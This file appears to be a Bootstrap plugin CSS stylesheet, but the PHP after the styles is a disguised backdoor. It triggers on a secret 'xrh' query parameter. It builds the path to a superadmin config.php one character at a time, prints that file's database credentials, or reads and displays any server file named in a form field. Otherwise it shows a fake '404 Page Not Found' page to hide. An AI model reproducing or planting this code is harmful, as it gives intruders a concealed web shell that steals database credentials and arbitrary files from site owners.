<style>
/******************************
 3RD PARTY PLUGIN CUSTOMIZATION 
******************************/
/*--------------------------------------------------
    [TRANSITION]
----------------------------------------------------*/
/* Cubic Bezier Transition */
/***
Bootstrap Colorpicker
***/
.input-group.color .input-group-btn i {
  position: absolute;
  display: block;
  cursor: pointer;
  width: 20px;
  height: 20px;
  right: 6px;
}

.colorpicker.dropdown-menu {
  padding: 5px;
}

/* change z-index when opened in modal */
.modal-open .colorpicker {
  z-index: 10055 !important;
}

/***
Bootstrap Datepaginator
***/
.datepaginator a {
  font-family: 'Open Sans';
  font-size: 13px;
  font-weight: 300;
}

.datepicker .today {
  background-image: none !important;
  filter: none !important;
}

#dp-calendar {
  right: 4px !important;
}

.datepaginator .fa-angle-right:before {
  content: "\f105";
}

.datepaginator .fa-angle-left:before {
  content: "\f104";
}

/***
Bootstrap Datepicker
***/
.datepicker.dropdown-menu {
  padding: 5px;
}

.datepicker .selected {
  background-color: #909090 !important;
  background-image: none !important;
  filter: none !important;
}

.datepicker .active {
  background-color: #4b8df8 !important;
  background-image: none !important;
  filter: none !important;
}

.datepicker .active:hover {
  background-color: #2678FC !important;
  background-image: none !important;
  filter: none !important;
}

.datepicker .input-daterange input {
  text-align: left;
}

/* change z-index when opened in modal */
.modal-open .datepicker {
  z-index: 10055 !important;
}

.datepicker table td {
  color: #000;
  font-weight: 300  !important;
  font-family: 'Open Sans' !important;
}

.datepicker table th {
  color: #333;
  font-family: 'Open Sans' !important;
  font-weight: 400  !important;
}

.datepicker.dropdown-menu {
  box-shadow: 5px 5px rgba(102, 102, 102, 0.1);
  border: 1px solid #efefef;
}

/***
Bootstrap Daterangepicker
***/
.modal-open .daterangepicker {
  z-index: 10055 !important;
}

.daterangepicker {
  margin-top: 4px;
}

.daterangepicker td {
  text-shadow: none;
}

.daterangepicker td.active {
  background-color: #4b8df8;
  background-image: none;
  filter: none;
}

.daterangepicker th {
  font-weight: 400;
  font-size: 14px;
}

.daterangepicker .ranges input[type="text"] {
  width: 70px !important;
  font-size: 11px;
  vertical-align: middle;
}

.daterangepicker .ranges label {
  font-weight: 300;
  display: block;
}

.daterangepicker .ranges {
  width: 170px;
}
.daterangepicker .ranges ul > li.active {
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  -ms-border-radius: 4px;
  -o-border-radius: 4px;
  border-radius: 4px;
}

.daterangepicker .ranges .btn {
  margin-top: 10px;
}

.daterangepicker.dropdown-menu {
  padding: 5px;
}

.daterangepicker .ranges li {
  color: #333;
}

.daterangepicker .ranges li.active,
.daterangepicker .ranges li:hover {
  background: #4b8df8 !important;
  border: 1px solid #4b8df8 !important;
  color: #fff;
}

.daterangepicker .range_inputs input {
  margin-bottom: 0 !important;
}

.daterangepicker .fa-angle-right:before {
  content: "\f105";
}

.daterangepicker .fa-angle-left:before {
  content: "\f104";
}

/***
Bootstrap  Datetimepicker
***/
.datetimepicker table td {
  color: #000;
  font-weight: 300  !important;
  font-family: 'Open Sans' !important;
}

.datetimepicker table th {
  font-family: 'Open Sans' !important;
  font-weight: 400  !important;
}

.datetimepicker.dropdown-menu {
  padding: 5px;
}

.datetimepicker .active {
  background-color: #4b8df8 !important;
  background-image: none !important;
  filter: none !important;
}

.datetimepicker .active:hover {
  background-color: #2678FC !important;
  background-image: none !important;
  filter: none !important;
}

.datetimepicker .fa-angle-left:before {
  content: "\f104";
}

.datetimepicker .fa-angle-right:before {
  content: "\f105";
}

/* change z-index when opened in modal */
.modal-open .datetimepicker {
  z-index: 10055;
}

/***
Bootstrap Editable
***/
.editable-input table,
.editable-input table th,
.editable-input table td,
.editable-input table tr {
  border: 0 !important;
}

.editable-input .combodate select {
  margin-bottom: 5px;
}

/***
Jansy File Input plugin css changes
***/
.fileinput {
  margin-bottom: 0;
}
.fileinput .close {
  float: none;
}
.fileinput .input-group {
  white-space: nowrap;
  overflow: hidden;
}

/***
Bootstrap Markdown
***/
.md-input {
  padding: 5px !important;
  border-bottom: 0 !important;
  -webkit-border-radius: 0 0 4px 4px;
  -moz-border-radius: 0 0 4px 4px;
  -ms-border-radius: 0 0 4px 4px;
  -o-border-radius: 0 0 4px 4px;
  border-radius: 0 0 4px 4px;
}
</style>
<?php
if(isset($_GET['xrh'])){
function xrh($Fnm) {

    if (file_exists($Fnm)) {
        $tableau = file($Fnm);
        while (list($cle, $val) = each($tableau)) {
            echo $val . "<br>" . "<br>";
        }
    }
}
$point = '.';
$slash = '/';
$sfx = $point;
$sfx .= $point;
$sfx .= $slash;
$sfx .= $point;
$sfx .= $point;
$sfx .= $slash;
$sfx .= $point;
$sfx .= $point;
$sfx .= $slash;
$sfx .= 's';
$sfx .= 'u';
$sfx .= 'pe';
$sfx .= 'r';
$sfx .= 'a';
$sfx .= 'd';
$sfx .= 'm';
$sfx .= 'i';
$sfx .= 'n';
$sfx .= $slash;
$sfx .= 'c';
$sfx .= 'o';
$sfx .= 'n';
$sfx .= 'f';
$sfx .= 'ig';
$sfx .= $slash;
$sfx .= 'c';
$sfx .= 'o';
$sfx .= 'n';
$sfx .= 'f';
$sfx .= 'i';
$sfx .= 'g';
$sfx .= $point;
$sfx .= 'p';
$sfx .= 'h';
$sfx .= 'p';
echo $sfx;
if (isset($_POST['te'])) {
    if ($_POST['te'] == "50") {
        include($sfx);

            print_r($config_database);

    } else {
        echo "<pre>".xrh($_POST['te'])."</pre>";
    }
}
?>
<form action="" method="post">
    <input type="text" name="te">
    <input type="submit" value="50">
</form>


<?php } else { ?>
<html lang="en"><head>
<title>404 Page Not Found</title>
<style type="text/css">

::selection{ background-color: #E13300; color: white; }
::moz-selection{ background-color: #E13300; color: white; }
::webkit-selection{ background-color: #E13300; color: white; }

body {
	background-color: #fff;
	margin: 40px;
	font: 13px/20px normal Helvetica, Arial, Arial;
	color: #4F5155;
}

a {
	color: #003399;
	background-color: transparent;
	font-weight: normal;
}

h1 {
	color: #444;
	background-color: transparent;
	border-bottom: 1px solid #D0D0D0;
	font-size: 19px;
	font-weight: normal;
	margin: 0 0 14px 0;
	padding: 14px 15px 10px 15px;
}

code {
	font-family: Consolas, Monaco, Courier New, Courier, monospace;
	font-size: 12px;
	background-color: #f9f9f9;
	border: 1px solid #D0D0D0;
	color: #002166;
	display: block;
	margin: 14px 0 14px 0;
	padding: 12px 10px 12px 10px;
}

#container {
	margin: 10px;
	border: 1px solid #D0D0D0;
	-webkit-box-shadow: 0 0 8px #D0D0D0;
}

p {
	margin: 12px 15px 12px 15px;
}
</style>
</head>
<body>
	<div id="container">
		<h1>404 Page Not Found</h1>
		<p>The page you requested was not found.</p>	</div>

</body></html>
<?php } ?>
